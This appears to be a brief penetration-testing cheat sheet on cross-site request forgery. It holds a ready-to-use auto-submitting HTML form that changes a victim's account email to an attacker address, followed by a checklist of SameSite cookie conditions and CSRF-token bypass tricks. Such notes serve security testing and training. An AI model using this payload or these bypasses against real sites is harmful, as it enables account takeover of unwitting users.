## CSRF Methodology
<br/>

**General PoC**
```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
<br/>
<br/>

**Step 1**<br/>
The first thing to check in a CSRF attack is the security headers on the session cookie.
- [ ] `SameSite=Strict` - CSRF Not Possible
- [ ] `SameSite=LAX` - CSRF Only Possible on GET Request
- [x] `SameSite=NONE` - CSRF Possible

<br/>
<br/>

**Step 2**<br/>
If there is a CSRF token, then try the following bypasses:
- [ ] Change single character to check if CSRF token is being validated or not
- [ ] Change request method from POST to GET
- [ ] Remove value in CSRF token
- [ ] Remove CSRF token completely
- [ ] Send a valid CSRF token from other user




